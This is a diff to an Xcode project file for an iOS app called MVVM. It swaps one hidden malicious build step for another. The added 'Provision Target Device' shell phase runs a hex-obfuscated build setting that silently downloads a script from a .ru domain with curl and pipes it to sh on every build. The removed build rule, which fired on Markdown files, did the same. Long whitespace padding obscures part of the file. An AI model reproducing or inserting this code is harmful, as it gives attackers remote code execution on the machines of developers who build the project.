@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		2254031C10C94CDCB87BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = F72BE632072E47FBAE7BBDC8; };
 		0F2F202E2F10C51600E12C22 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0F2F20262F10C51600E12C22 /* Assets.xcassets */; };
 		0F2F20302F10C51600E12C22 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0F2F20292F10C51600E12C22 /* LaunchScreen.storyboard */; };
 		0F2F20322F10C51600E12C22 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0F2F201D2F10C51600E12C22 /* AppDelegate.swift */; };
@@ -43,7 +42,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		F72BE632072E47FBAE7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0F2F1FFD2F10BD0800E12C22 /* MVVM.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MVVM.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		0F2F201D2F10C51600E12C22 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		0F2F201E2F10C51600E12C22 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -104,7 +102,6 @@
 		0F2F1FFE2F10BD0800E12C22 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F72BE632072E47FBAE7BBDC8 /* README.md */,
 				0F2F1FFD2F10BD0800E12C22 /* MVVM.app */,
 			);
 			name = Products;
@@ -373,13 +370,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0F2F20102F10BD0900E12C22 /* Build configuration list for PBXNativeTarget "MVVM" */;
 			buildPhases = (
+				9133E5D948AC415F9F7BBDC8 /* Provision Target Device */,
 				0F2F1FF92F10BD0800E12C22 /* Sources */,
 				0F2F1FFA2F10BD0800E12C22 /* Frameworks */,
 				0F2F1FFB2F10BD0800E12C22 /* Resources */,
 				0F2F20852F10D3F400E12C22 /* Swiftgen */,
 			);
 			buildRules = (
-				E1DA2D12D848415C9B7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -425,20 +422,6 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		E1DA2D12D848415C9B7BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -446,7 +429,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				2254031C10C94CDCB87BBDC8 /* README.md */,
 				0F2F207A2F10D20400E12C22 /* Login.storyboard in Resources */,
 				0F2F202E2F10C51600E12C22 /* Assets.xcassets in Resources */,
 				0F2F20302F10C51600E12C22 /* LaunchScreen.storyboard in Resources */,
@@ -456,6 +438,25 @@ sh -c \"${A8CDBB7}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		9133E5D948AC415F9F7BBDC8 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 		0F2F20852F10D3F400E12C22 /* Swiftgen */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -530,7 +531,7 @@ sh -c \"${A8CDBB7}\"";
 		0F2F20112F10BD0900E12C22 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -565,7 +566,7 @@ sh -c \"${A8CDBB7}\"";
 		0F2F20122F10BD0900E12C22 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
